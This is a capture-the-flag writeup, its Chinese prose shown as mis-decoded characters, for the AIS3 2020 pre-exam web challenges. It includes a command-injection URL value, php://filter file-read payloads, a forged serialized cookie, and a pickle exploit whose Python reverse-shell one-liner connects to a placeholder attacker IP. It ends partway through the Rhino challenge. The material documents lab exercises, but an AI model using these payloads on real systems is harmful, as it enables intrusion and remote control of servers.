---
title:  "AIS3 2020 Pre-exam Writeup (ä¸­æ–‡)"
categories: writeup
tags: "zh-tw"
header:
  overlay_color: "#000"
  overlay_filter: "0.75"
  overlay_image: assets/images/posts/ais3-2020-writeup/CRNHLxU.png
#   actions:
#     - label: "English"
#       url: /writeup/2020/06/28/ais3-preexam-en-2020/
toc: true
excerpt: "AIS3 å‰æ¸¬æ™‚é–“åˆåˆ°äº†!"
---

## å‰è¨€

å°å¼Ÿä¸­æ–‡ä¸å¥½ï¼Œå¦‚æœæœ‰ä¸­æ–‡ä¸é€šé †çš„åœ°æ–¹è«‹è¦‹è«’ <(ï¼¿ã€€ï¼¿)>

é€™æ¬¡æ¯”æˆ‘å»å¹´ç¬¬ä¸€æ¬¡æ‰“çš„æ™‚å€™æœ‰ç¶“é©—å¤šäº†ï¼Œå»å¹´å·®ä¸å¤š100åå·¦å³ï¼Œé€™æ¬¡çˆ¬åˆ°äº† 43 åã€‚å¾ˆå¯æƒœçš„ï¼Œæœ‰å¹¾é¡Œæˆ‘éƒ½æ˜¯æˆ³ä¸­é‚Šæˆ–è€…æ˜¯èŠ±å¤ªå¤šæ™‚é–“åœ¨éƒ¨åˆ†é¡Œç›®å°è‡´å…¶ä»–å¹¾é¡Œæ²’æœ‰å¤šé¤˜æ™‚é–“çœ‹å®Œã€‚æ¯”å¦‚åƒæ˜¯ Claraï¼ŒClara é‚£é¡Œæˆ‘å¾ˆæ—©å°±çœ‹åˆ°æœ‰å•é¡Œçš„å°åŒ…ç”šè‡³æ˜¯ Key Exchange ä¸­çš„ Keyï¼Œä½†æ˜¯åªèƒ½èªªç¶“é©—ä¸è¶³ï¼Œä¸€é–‹å§‹æ²’æ„è­˜åˆ°æˆ‘æ‰€çœ‹åˆ°çš„å­—ä¸²éƒ¨åˆ†æ˜¯ Keyï¼Œè€ŒåŠ å¯†æ–¹å¼æ˜¯ç´”ç²¹ XORã€‚æˆ‘æ˜¯åœ¨æ¯”è³½çµæŸå¾Œæ²’å¤šä¹…æ‰ç™¼ç¾é€™å›äº‹çš„ã€‚éå¸¸å¯æƒœå› ç‚º Clara é‚£é¡Œ 500 åˆ†ã€‚ä½†æ•´é«”è€Œè¨€æˆ‘é‚„æ˜¯å°é€™æ¬¡ AIS3 å¾ˆæ»¿æ„ä¹Ÿè¦ºå¾—åˆå­¸åˆ°äº†ä¸å°‘ï¼Œå¦‚ Rose é‚£é¡Œï¼Œæˆ‘åœ¨ä¹‹å‰å…¶å¯¦æ²’æœ‰æ„è­˜åˆ° Python åœ¨åŸ·è¡Œæ™‚æœƒ Compile æˆ Bytecodeï¼Œä¹Ÿè¶æ©Ÿå­¸æœƒäº†é€™é»ã€‚

![](/assets/images/posts/ais3-2020-writeup/BOIkrai.png)

## Web

### ğŸ¿ Squirrel (100 pt.)

é€™é¡Œä¸€æ‰“é–‹æœƒçœ‹åˆ°ä¸€å †åˆ°è™•åœ¨è·‘çš„æ¾é¼ ï¼Œä¸€é–‹å§‹å®Œå…¨ä¸çŸ¥é“åœ¨å¹¹å˜›ï¼Œä½†é‚£äº›æ¾é¼ ä¸Šå¯«çš„ç”¨æˆ¶åéå¸¸ä¼¼æ›¾ç›¸è­˜... é€™äº›ä¸æ˜¯å¸¸è¦‹çš„Linuxä½¿ç”¨è€…å¸³è™Ÿå—ï¼Ÿ 

![](/assets/images/posts/ais3-2020-writeup/eitKpZA.png)

ä¼°è¨ˆæ˜¯å¾ `/etc/passwd` ç¿»å‡ºä¾†çš„ï¼Œå’±å€‘ä¾†çœ‹çœ‹é€™å€‹ç¶²é çš„åŸå§‹ç¢¼ã€‚

```shell
â¯ curl https://squirrel.ais3.org/
<!DOCTYPE html>

<head>
  <title>ğŸ¿ï¸ğŸ¿ï¸ğŸ¿ï¸ğŸ¿ï¸ğŸ¿ï¸</title>
  <meta charset="utf-8">
  <link rel="stylesheet" href="css/style.css">
</head>

<body>
  <template id="squirrel-template">
    <div class="squirrel">
      <div class="icon">ğŸ¿ï¸</div>
      <div class="name">squirrel</div>
    </div>
  </template>

  <script src="js/squirrel.js"></script>
  <script>
    const squirrelFile = '/etc/passwd';

    fetch('api.php?get=' + encodeURIComponent(squirrelFile))
      .then(res => res.json())
      .then(data => {
        if ('error' in data) {
          throw data.error;
        }
        data.output.split('\n')
          .map(line => line.split(':')[0].trim())
          .filter(name => name.length)
          .forEach(name => new Squirrel(name).update());
      })
      .catch(err => {
        console.log(err);
        alert('Something went wrong! Please report this to the author!');
      });
  </script>
</body>
```

è·Ÿä¸€é–‹å§‹æƒ³çš„ä¸€æ¨£ï¼Œæœç„¶æ˜¯ `/etc/passwd` å‡ºä¾†çš„ï¼Œè€Œä¸”é¡Œç›®é‚„å¾ˆå¥½å¿ƒçš„å‘Šè¨´æˆ‘å€‘å¾å“ªè£¡æ‹‰é€™å€‹æª”æ¡ˆå‡ºä¾†çš„ï¼é€™å€‹æ™‚å€™å°±æ˜¯é–‹å§‹æˆ³ `api.php` çœ‹çœ‹æœƒæœ‰ä»€éº¼æ±è¥¿ã€‚æˆ‘å€‘é€é `api.php` çš„ GET parameter å¯ä»¥å¾—çŸ¥é€™å€‹ PHP æœ‰å¾ˆå¤§çš„ LFI (Local File Inclusion) æ¼æ´ã€‚é€™æ™‚æˆ‘å€‘å¯ä»¥é€éå®ƒä¾†å–å¾—è‡ªå·±çš„åŸå§‹ç¢¼ã€‚

![](/assets/images/posts/ais3-2020-writeup/ZkPkcf7.png)

çœ‹èµ·ä¾†éƒ½å·²ç¶“é€é `json_encode` æŠŠæ‰€æœ‰çš„æ›è¡Œç¬¦è™Ÿæ›¿æ›æˆ `\n`ï¼Œé€™æ™‚å¯ä»¥é€éPowerShellçš„ string.Replace æŠŠæ‰€æœ‰çš„ `\n` æ›å›æœ¬åœ°ç«¯ç›¸å®¹çš„æ›è¡Œç¬¦è™Ÿä»¥ä¾¿è®€å–ã€‚

```powershell
(curl https://squirrel.ais3.org/api.php?get=api.php -s).replace('\n',[System.Environment]::NewLine)
```

ä¹‹å¾Œå°±å¯ä»¥è¼•é¬†å–å¾—å¯æ–¹ä¾¿è®€å–çš„åŸå§‹ç¢¼ã€‚

```php
<?php

header('Content-Type: application/json');

if ($file = @$_GET['get']) {
    $output = shell_exec("cat '$file'");

    if ($output !== null) {
        echo json_encode([
            'output' => $output
        ]);
    } else {
        echo json_encode([
            'error' => 'cannot get file'
        ]);
    }
} else {
    echo json_encode([
        'error' => 'empty file path'
    ]);
}
```

è€Œåœ¨ Line 6 æˆ‘å€‘å¯ä»¥çœ‹åˆ°ä¸€å€‹éå¸¸æœ‰å•é¡Œçš„ `shell_exec`ï¼Œæ ¹æ“šå®˜æ–¹æŠ€è¡“æ–‡ä»¶å¯ä»¥å¾—çŸ¥ shell_exec é€šå¸¸æœƒä»¥ä½¿ç”¨è€… `www` çš„èº«åˆ†åŸ·è¡Œä»»ä½•æŒ‡ä»¤ä¸¦å°‡ stdout å™´å›è®Šæ•¸å…§ã€‚è€Œé€™é»å±éšªæ˜¯å±éšªåœ¨ç•¶ä½¿ç”¨è€…å¯ä»¥å­˜å–è®Šæ•¸å…§å®¹æ™‚ï¼Œä½¿ç”¨è€…å¯ä»¥é€é Command Injection çš„æ–¹å¼åŸ·è¡Œä»»æ„æŒ‡ä»¤ã€‚æˆ‘å€‘å› æ­¤å¯ä»¥é€éå­—å…ƒé€ƒè„« (character escape) çš„æ–¹å¼è·³å‡º `cat '$file'` ä¸­çš„å–®å¼•è™Ÿï¼Œæ¥è‘—é€éåˆ†è™Ÿä¾†åŸ·è¡Œç¬¬äºŒå€‹æŒ‡ä»¤ã€‚

æ‰€ä»¥æœ€çµ‚çµæœçš„URLæ˜¯ `https://squirrel.ais3.org/api.php?get=';ls+/'`

```json
{
  "output": "5qu1rr3l_15_4_k1nd_0f_b16_r47.txt\nbin\nboot\ndev\netc\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n"
}
```

å¤§åŠŸå‘Šæˆï¼æˆ‘å€‘æ‹¿åˆ°äº† `/` åº•ä¸‹çš„ç›®éŒ„ï¼Œè€Œä¸”å‰›å¥½æˆ‘å€‘çš„flagæª”æ¡ˆä¹Ÿåœ¨æ ¹ç›®éŒ„ä¸‹ï¼

```shell
â¯ curl "https://squirrel.ais3.org/api.php?get=/5qu1rr3l_15_4_k1nd_0f_b16_r47.txt" -s | jq -C

{
  "output": "AIS3{5qu1rr3l_15_4_k1nd_0f_b16_r47}\n"
}
```

Flag:
`AIS3{5qu1rr3l_15_4_k1nd_0f_b16_r47}`

### ğŸ¦ˆ Shark (100 pt.)

> Let's dive deep again this year.

å› ç‚ºå»å¹´æœ‰æ‰“é AIS3 2019 çš„é—œä¿‚ï¼Œæ‰€ä»¥é¦¬ä¸Šæƒ³åˆ°çš„æ˜¯å»å¹´ dive deeper çš„é¡Œç›®ï¼Œæ˜¯å€‹ç”¨ `php://filter` è§£çš„ç¶“å…¸LFIé¡Œã€‚ä¸ç®¡æ˜¯ä¸æ˜¯ï¼Œæˆ‘å€‘å…ˆ curl çœ‹ä¸€çœ‹å†èªªã€‚

![](/assets/images/posts/ais3-2020-writeup/D44YYq7.png)

çœ‹åˆ° `?path=hint.txt` æ„Ÿè¦ºåˆæ˜¯ä¸€å€‹LFIé¡Œï¼Œæˆ‘å€‘å…ˆçœ‹çœ‹ `index.php` æœ‰æ²’æœ‰å­˜åœ¨ã€‚

```php
<?php

    if ($path = @$_GET['path']) {
        if (preg_match('/^(\.|\/)/', $path)) {
            // disallow /path/like/this and ../this
            die('<pre>[forbidden]</pre>');
        }
        $content = @file_get_contents($path, FALSE, NULL, 0, 1000);
        die('<pre>' . ($content ? htmlentities($content) : '[empty]') . '</pre>');
    }

?>
```
æœç„¶æœ‰ï¼Œè€Œä¸”é‚„é€é regex æŠŠå¸¸è¦‹çš„å±éšªç¬¦è™Ÿéƒ½å»æ‰äº†ï¼
ä½†æ˜¯ï¼
`php://` çš„URIæ²’æœ‰å»æ‰ï¼æœç„¶è·Ÿå»å¹´é¡Œç›®ä¸€æ¨£å‘¢ï¼

`php://` æ˜¯ä»€éº¼å‘¢ï¼Ÿ å®˜æ–¹æ–‡ä»¶å¯«é“ï¼š

>PHP comes with many built-in wrappers for various URL-style protocols for use with the filesystem functions such as fopen(), copy(), file_exists() and filesize(). In addition to these wrappers, it is possible to register custom wrappers using the stream_wrapper_register() function.

>php://filter is a kind of meta-wrapper designed to permit the application of filters to a stream at the time of opening. This is useful with all-in-one file functions such as readfile(), file(), and file_get_contents() where there is otherwise no opportunity to apply a filter to the stream prior the contents being read.

å¯«çš„é€™éº¼å¤šåŸºæœ¬ä¸Šå°±æ˜¯åœ¨èªªé€™äº› PHP protocol å¯ä»¥ç”¨ä¾†å­˜å– filesystem çš„æ±è¥¿ã€‚é‚£éº¼ï¼Œå°æˆ‘ä¾†èªªåˆ°åº•èƒ½ç”¨å®ƒåšä»€éº¼å‘¢ï¼Ÿæˆ‘å€‘ä¾†çœ‹çœ‹é€™ç¯‡ [Using php://filter for local file inclusion](https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/)ï¼Œæˆ‘å€‘å¾—çŸ¥å¯ä»¥é€é `php://filter/convert.base64-encode/resource=<targetFile>` ä¾†é€²è¡Œ filter evasionã€‚é‚£æˆ‘å€‘åœ¨çŸ¥é“é€™é»ä¹‹å¾Œè©²åšä»€éº¼å‘¢ï¼Ÿ

æˆ‘å€‘é€é `hint.txt` çŸ¥é“ä»–è¦æˆ‘å€‘å»æŒ–å…¶ä»–ä¼ºæœå™¨ä¸Šçš„ flagï¼Œé‚£æˆ‘å€‘åˆ°åº•è¦æ€éº¼çŸ¥é“å…§ç¶²çš„IPé•·ä»€éº¼æ¨£ï¼Ÿæ—¢ç„¶æ˜¯ä¼ºæœå™¨ï¼Œæˆ‘å€‘å¯ä»¥çŒœæ¸¬é€™å°é›»è…¦å¯èƒ½èˆ‡å…¶ä»–é›»è…¦ä¼ºæœå™¨æœƒé€²è¡Œæºé€šã€‚é€™æ™‚ï¼Œæˆ‘å€‘å¯ä»¥é€éåƒæ˜¯ `/proc/net/tcp` ä¹‹é¡çš„æª”æ¡ˆä¾†å¾—çŸ¥æœ‰èˆ‡é€™å°é›»è…¦é€²è¡Œ TCP é€£ç·šçš„å‹•ä½œã€‚

æ‰€ä»¥æˆ‘å€‘çš„ payload å¤§æ¦‚å¯ä»¥å¯«æˆé€™æ¨£ï¼š
```
https://shark.ais3.org/?path=php://filter/convert.base64-encode/resource=/proc/net/tcp
```

æˆ‘å€‘å¯¦éš›å»åŸ·è¡Œå¯ä»¥æ‹¿åˆ°ä»¥ä¸‹ Base64 çš„å­—ä¸²ï¼š
```
ICBzbCAgbG9jYWxfYWRkcmVzcyByZW1fYWRkcmVzcyAgIHN0IHR4X3F1ZXVlIHJ4X3F1ZXVlIHRyIHRtLT53aGVuIHJldHJuc210ICAgdWlkICB0aW1lb3V0IGlub2RlICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgMDogMDAwMDAwMDA6MDA1MCAwMDAwMDAwMDowMDAwIDBBIDAwMDAwMDAwOjAwMDAwMDAwIDAwOjAwMDAwMDAwIDAwMDAwMDAwICAgICAwICAgICAgICAwIDEwNzc4MjE2NSAxIDAwMDAwMDAwZGJjZjMwZmYgOTkgMCAwIDEwIDAgICAgICAgICAgICAgICAgICAKICAgMTogMEIwMDAwN0Y6QTQzNSAwMDAwMDAwMDowMDAwIDBBIDAwMDAwMDAwOjAwMDAwMDAwIDAwOjAwMDAwMDAwIDAwMDAwMDAwICAgICAwICAgICAgICAwIDEwNzc1OTQwNiAxIDAwMDAwMDAwNTU2M2NmMTIgOTkgMCAwIDEwIDAgICAgICAgICAgICAgICAgICAKICAgMjogMDMwMDE2QUM6MDA1MCAwMTAwMTZBQzo5QTIwIDAxIDAwMDAwMDAwOjAwMDAwMDAwIDAyOjAwMEFGQzdGIDAwMDAwMDAwICAgIDMzICAgICAgICAwIDIwOTIzOTg1MCAyIDAwMDAwMDAwOTBiNTkxNTkgMjAgMyAzMCAxMCAtMSAgICAgICAgICAgICAgICAK
```

é€™æ™‚æ‹¿å»é¤µçµ¦ Base64 decode å°±å¯ä»¥æ‹¿åˆ°æˆ‘å€‘çš„çµæœäº†ï¼

```
  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                                                     
   0: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 107782165 1 00000000dbcf30ff 99 0 0 10 0                  
   1: 0B00007F:A435 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 107759406 1 000000005563cf12 99 0 0 10 0                  
   2: 030016AC:0050 010016AC:9A20 01 00000000:00000000 02:000AFC7F 00000000    33        0 209239850 2 0000000090b59159 20 3 30 10 -1                
```

é‚£æˆ‘å€‘è¦æ€éº¼è§£è®€ `/proc/net/tcp` æª”æ¡ˆå‘¢ï¼Ÿé€™æ™‚æˆ‘å€‘å¯ä»¥å»çœ‹çœ‹ç›¸é—œçš„ [man page](https://metacpan.org/pod/release/SALVA/Linux-Proc-Net-TCP-0.05/lib/Linux/Proc/Net/TCP.pm) ä¾†å¾—çŸ¥å¦‚ä½•è®€å–è©²æª”æ¡ˆã€‚

```
  46: 010310AC:9C4C 030310AC:1770 01 
  |      |      |      |      |   |--> connection state
  |      |      |      |      |------> remote TCP port number
  |      |      |      |-------------> remote IPv4 address
  |      |      |--------------------> local TCP port number
  |      |---------------------------> local IPv4 address
  |----------------------------------> number of entry
```
 
æˆ‘å€‘é€éæ–‡ä»¶å¾—çŸ¥IPä½å€æ˜¯hex-encodedè€Œä¸”æ˜¯åéä¾†çš„ï¼Œæ‰€ä»¥é€™æ¨£æˆ‘å€‘å¯ä»¥æ¨å‡ºæˆ‘å€‘çš„ subnet æ˜¯ `172.22.0.0`ã€‚é€™æ™‚æˆ‘å€‘å¯ä»¥ä¸€å€‹ä¸€å€‹å»æˆ³çœ‹çœ‹ï¼Œç”¨PowerShellè·Ÿ ForEach Parallel æˆ‘å€‘å¯ä»¥å¾ˆå¿«åœ°å°±æˆ³åˆ°æˆ‘å€‘çš„çµæœã€‚

![](/assets/images/posts/ais3-2020-writeup/EONCWZz.png)

Flag:
`AIS3{5h4rk5_d0n'7_5w1m_b4ckw4rd5}`

### ğŸ˜ Elephant (168 pt.)

> Do elephants love cookies?

é¦¬ä¸Šè¯æƒ³åˆ°é€™é¡Œæ‡‰è©²æ˜¯è·Ÿ Cookie æœ‰é—œçš„é¡Œç›®ã€‚æˆ‘å€‘ä¸€é–‹å§‹æœƒå…ˆçœ‹åˆ°é€™æ¨£çš„ç™»å…¥é é¢ã€‚

![](/assets/images/posts/ais3-2020-writeup/fuCZyzW.png)

æˆ‘å€‘é€™æ™‚å¯ä»¥é€é Fiddler ä¾†çœ‹çœ‹æŒ‰ä¸‹ç™»å…¥æ™‚æœƒæœ‰ä»€éº¼é€£ç·šã€‚


```
#	Result	Protocol	Host	URL	Body	Caching	Content-Type	Process	Comments	Custom	
6	302	HTTPS	elephant.ais3.org	/	0		text/html; charset=UTF-8	msedge:10224			
7	200	HTTPS	elephant.ais3.org	/	504		text/html; charset=UTF-8	msedge:10224			
```

```
HTTP/1.1 302 Found
Server: nginx/1.18.0
Date: Tue, 16 Jun 2020 13:09:40 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 0
Connection: keep-alive
X-Powered-By: PHP/7.4.6
Location: /
Set-Cookie: elephant_user=Tzo0OiJVc2VyIjoyOntzOjQ6Im5hbWUiO3M6NzoiYXNkZmFzZCI7czoxMToiAFVzZXIAdG9rZW4iO3M6MzI6ImYyOGEzNzk4Njg4ZDI4ZTE1MDY5MWE5Mjc4NDZlYjM2Ijt9; expires=Tue, 16-Jun-2020 13:19:40 GMT; Max-Age=600
```

çœ‹èµ·ä¾†é¦–å…ˆæœƒå…ˆè¨­ç½® Cookie ç„¶å¾Œå†å°å›è‡³é¦–é ï¼Œä¸éé€™ Cookie çœ‹èµ·ä¾†ä¼¼ä¹æœ‰é»... ä¼¼æ›¾ç›¸è­˜ï¼Ÿæˆ‘å€‘é€é Fiddler çš„ TextWizard ä¾†çœ‹çœ‹è§£ä¸è§£åœ°å‡ºä¾†ã€‚

![](/assets/images/posts/ais3-2020-writeup/PABvoAJ.png)

å•Šå“ˆï¼çœ‹èµ·ä¾†æ˜¯ Base64 å‘¢ï¼è€Œä¸”çœ‹èµ·ä¾†æ˜¯æŸç¨®åºåˆ—åŒ–å¾Œçš„çµæœã€‚æˆ‘å€‘ä¾†æŸ¥æŸ¥ [PHP çš„ Serialization ç›¸é—œæ–‡ä»¶](https://www.php.net/manual/en/function.serialize.php)ã€‚

```
<?
/*
Anatomy of a serialize()'ed value:

String
s:size:value;

Integer
i:value;

Boolean
b:value; (does not store "true" or "false", does store '1' or '0')

Null
N;

Array
a:size:{key definition;value definition;(repeated per element)}

Object
O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}

String values are always in double quotes
Array keys are always integers or strings
    "null => 'value'" equates to 's:0:"";s:5:"value";',
    "true => 'value'" equates to 'i:1;s:5:"value";',
    "false => 'value'" equates to 'i:0;s:5:"value";',
    "array(whatever the contents) => 'value'" equates to an "illegal offset type" warning because you can't use an
    array as a key; however, if you use a variable containing an array as a key, it will equate to 's:5:"Array";s:5:"value";',
     and
    attempting to use an object as a key will result in the same behavior as using an array will.
*/
?>
```

æˆ‘å€‘å¯ä»¥å¾ä¸­æ¨å‡ºé€™å€‹åŸæœ¬æ˜¯ä¸€å€‹ `User` classï¼Œç„¶å¾Œå…¶ä¸­çš„ Properties æœ‰ `[0x00]User[0x00]Token` åŠ `name`ã€‚ä½†æ˜¯æˆ‘å€‘çŸ¥é“äº†é€™é»åˆèƒ½æ€æ¨£ï¼Ÿæˆ‘åœ¨æ‰“çš„æ™‚å€™æœ‰è©¦éå°‡ username æ›ç‚º `admin` ç­‰å­—çœ¼ï¼Œä½†æƒ³ä¹ŸçŸ¥é“ä¸æœƒé€šï¼Œå› ç‚ºæˆ‘å€‘ç™»å…¥çš„æ™‚å€™å°±å¯ä»¥æ‰“ `admin` å•¦ï¼Ÿ

æˆ‘çš„å¦å¤–çš„æƒ³æ³•æ˜¯å¦‚æœæˆ‘è®“ä»–å™´éŒ¯æˆ–ç„¡æ³•ååºåˆ—åŒ–æœƒæ€éº¼æ¨£ï¼Ÿæ‰€ä»¥æˆ‘æŠŠåºåˆ—åŒ–çš„ Payload æ”¹æˆä»¥ä¸‹:

```
O:4:"User":0:{}
```

å†å°‡å…¶ Base64 è¨­æˆ Cookie å¾Œå†é€å‡ºã€‚

![](/assets/images/posts/ais3-2020-writeup/1ZjBBkt.jpg)

ç„¶å¾Œ Flag å°±è«åå…¶å¦™å™´å‡ºä¾†äº†(X)ã€‚å…¶å¯¦æˆ‘ä¸æ˜¯å¾ˆæ‡‚é€™é¡Œåœ¨è€ƒæˆ‘å€‘ä»€éº¼ï¼Œæ˜¯åœ¨è€ƒæˆ‘å€‘PHPåºåˆ—åŒ–å¾Œçš„dataé•·ä»€éº¼æ¨£å—ï¼Ÿæˆ‘å…¶å¯¦æ»¿å¥½å¥‡çš„ã€‚

Flag:
`AIS3{0nly_3l3ph4n75_5h0uld_0wn_1v0ry}`

### ğŸ Snake (272 pt.)

Snake çš„é€£çµä¸€é–‹èµ·ä¾†æœƒçœ‹åˆ°ä»¥ä¸‹åŸå§‹ç¢¼ï¼š

```python
from flask import Flask, Response, request
import pickle, base64, traceback

Response.default_mimetype = 'text/plain'

app = Flask(__name__)

@app.route("/")
def index():
    data = request.values.get('data')
    
    if data is not None:
        try:
            data = base64.b64decode(data)
            data = pickle.loads(data)
            
            if data and not data:
                return open('/flag').read()

            return str(data)
        except:
            return traceback.format_exc()
        
    return open(__file__).read()
```

é›–ç„¶ä¹‹å‰æ²’ç¢°é Flaskï¼Œå¯æ˜¯é€™é¡Œå¾ˆæ˜é¡¯ä¸éœ€è¦çŸ¥é“ Flaskï¼Œå› ç‚ºä¸€çœ‹å°±çŸ¥é“é€™é¡Œæœ€å¤§çš„å•é¡Œæ˜¯ Pickle (L15)ã€‚ `pickle.loads` å¯ä»¥èªªæ˜¯éå¸¸å±éšªçš„ä¸€å€‹ callï¼Œç”šè‡³é€£[å®˜æ–¹æ–‡ä»¶](https://docs.python.org/3/library/pickle.html)éƒ½é€™éº¼å¯«ï¼š

> The pickle module is not secure. Only unpickle data you trust. It is possible to construct malicious pickle data which will execute arbitrary code during unpickling. Never unpickle data that could have come from an untrusted source, or that could have been tampered with.
{: .notice--danger}

æ—¢ç„¶æˆ‘å€‘çŸ¥é“æœ‰å¯èƒ½å¯ä»¥é€²è¡Œ ACE (Arbitrary Code Execution)ï¼Œé‚£æˆ‘å€‘å°±ä¾†å¯«å¯«çœ‹æˆ‘å€‘çš„ payloadã€‚å°æˆ‘å€‘ä¾†èªªæ—¢ç„¶çŸ¥é“èƒ½é€²è¡Œ ACEï¼Œæœ€æ–¹ä¾¿çš„æ–¹å¼å°±æ˜¯å¯«å€‹ Reverse Shell åˆ°äººå®¶é›»è…¦ä¸Šæ—äº‚ã€‚

{% capture pickle-note %}
å»¶ä¼¸é–±è®€ï¼š
- [Exploiting Python pickles](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)
- [Security Issues in Python Pickle](/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf)
- [Pickle Arbitrary Code Execution](https://root4loot.com/post/exploiting_cpickle/)
{% endcapture %}

<div class="notice--info">
  {{ pickle-note | markdownify }}
</div>

é€éä¸€äº›å»¶ä¼¸é–±è®€ï¼Œå‡ºäº†ä¸‹åˆ—æŒ‡ä»¤ï¼š

```
import sys,socket,os,pty;s=socket.socket();s.connect((AttackerIP, AttackPort));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")
```

```python
def exploit(command):
    assert type(command) is list
    payload_prefix = b'''(('''
    payload_suffix = b'''lisubprocess\nPopen\n.'''
    payload_body = bytes()
    for c in command:
        payload_body += b"X" + bytes(struct.pack("<I", len(c))) + bytes(c, encoding="utf-8")
    payload = payload_prefix + payload_body + payload_suffix
    assert b'R' not in payload
    return payload

def main():
    payload = exploit([
        "python",
        "-c",
        command
    ])
    print(base64.b64encode(payload))
```

åœ¨æœ¬åœ°ç«¯è¨­å®šå¥½netcatï¼Œå°‡å…¶Base64 outputä¸Ÿå›è‡³ä¼ºæœå™¨ä¸­ï¼Œå°±æˆåŠŸæ‹¿åˆ°äº†å°æ–¹é›»è…¦çš„ Shell!

![](/assets/images/posts/ais3-2020-writeup/C7JcqEm.png)

![](/assets/images/posts/ais3-2020-writeup/BkFNr6O.png)

é€™é¡Œæˆ‘é‚„æ»¿å–œæ­¡çš„ï¼Œé€™å‘Šè¨´äº†å¤§å®¶ `pickle.loads` æ˜¯å€‹å¤šéº¼å±éšªçš„æ±è¥¿ã€‚

### ğŸ¦ Rhino (494 pt.)

Rhino é€™é¡Œå¾ HTML head å°±å¯ä»¥çœ‹å‡ºä¾†æ˜¯ Jekyll å‡ºä¾†çš„éœæ…‹ç¶²ç«™ï¼Œæ‰€ä»¥å†æ€éº¼æˆ³é€™ç¶²ç«™ä¹Ÿä¸æœƒå™´å‡ºä»€éº¼å¥‡æ€ªæ±è¥¿çš„ã€‚

```html
<!-- Begin Jekyll SEO tag v2.6.1 -->
<title>A Lonely Programmer | As you can see in the title, I am a lonely programmer. My favorite programming language is JavaScript and my favorite animal is rhino.</title>
<meta name="generator" content="Jekyll v4.0.1" />
<meta property="og:title" content="A Lonely Programmer" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="As you can see in the title, I am a lonely programmer. My favorite programming language is JavaScript and my favorite animal is rhino." />
<meta property="og:description" content="As you can see in the title, I am a lonely programmer. My favorite programming language is JavaScript and my favorite animal is rhino." />
<link rel="canonical" href="/" />
<meta property="og:url" content="/" />
<meta property="og:site_name" content="A Lonely Programmer" />
<script type="application/ld+json">
{"headline":"A Lonely Programmer","description":"As you can see in the title, I am a lonely programmer. My favorite programming language is JavaScript and my favorite animal is rhino.","name":"A Lonely Programmer","url":"/","@type":"WebSite","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
```

é‚£å°±... ç¶²ç«™èµ·æ‰‹å¼å…ˆçœ‹çœ‹ robots.txt/humans.txt æœ‰æ²’æœ‰æ±è¥¿å›‰ï¼Ÿ

![](/assets/images/posts/ais3-2020-writeup/rSmNxmC.png)

å…¶å¯¦ç•¶ä¸‹æ»¿æ„å¤–æœƒæœ‰çš„ï¼Œç•¢ç«Ÿæ˜¯è€ƒåˆ°çˆ›çš„æç¤º(X)ï¼Œä½†é€™çµ¦äº†æˆ‘å€‘è¨±å¤šç›¸é—œéœ€è¦çŸ¥é“çš„æ±è¥¿ã€‚

- é€™å€‹ç¶²ç«™æ˜¯ Node.JS ç•¶åŸºåº•çš„ (`node_modules`)
- æ ¹ç›®éŒ„ä¸‹*å¯èƒ½*æœ‰ .js åŠ .json åŠ .xml æª”
- æœ‰ flag.txt
    - æƒ³ä¹ŸçŸ¥é“ç¶²ç«™ä¸å¯èƒ½é€™éº¼å®¹æ˜“å°±çµ¦æˆ‘å€‘ flag çš„

é‚£æˆ‘å€‘æ—¢ç„¶çŸ¥é“æ˜¯ Node-basedï¼Œé‚£æˆ‘å€‘ä¾†æˆ³æˆ³çœ‹æœ‰æ²’æœ‰ `package.json`ã€‚

```jsonld
{
  "name": "app",
  "version": "1.0.0",
  "description": "",
  "scripts": {
    "start": "node chill.js",
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "author": "djosix",
  "license": "ISC",
  "dependencies": {
    "cookie-session": "^1.4.0",
    "express": "^4.17.1"
  }
}
```

æœ‰æ¬¸ï¼ä¸»ç¨‹å¼æ˜¯åœ¨ `chill.js`ï¼Œæˆ‘å€‘ä¾†çœ‹çœ‹é‚£å€‹è£¡é¢æ˜¯ä»€éº¼ï¼Ÿ

```javascript
const express = require('express');
const session = require('cookie-session');

let app = express();

app.use(session({
  secret: "I'm watching you."
}));

app.use('/', express.static('./'));

app.get('/flag.txt', (req, res) => {
  res.setHeader('Content-Type', 'text/plain');

  let n = req.session.magic;

  if (n && (n + 420) === 420)
    res.sendFile('/flag');
  else
    res.send('you are a sad person too');
});

app.get('*', function(req, res){
  res.status(404).sendFile('404.html', { root: __dirname });
});

app.listen(process.env.PORT, '0.0.0.0');
```

çœ‹èµ·ä¾†æˆ‘å€‘å¾—è‡ªè¡Œæ‰¾å‡ºä¸€å€‹æœ‰è¢« `I'm watching you.` ç°½ç« çš„ Cookie è€Œä¸” `magic` å€¼é‚„å¿…é ˆä¸ç­‰æ–¼ 0 å¯æ˜¯è·Ÿ 420 ç›¸åŠ æ™‚é‚„å¾—è¦ 420ã€‚

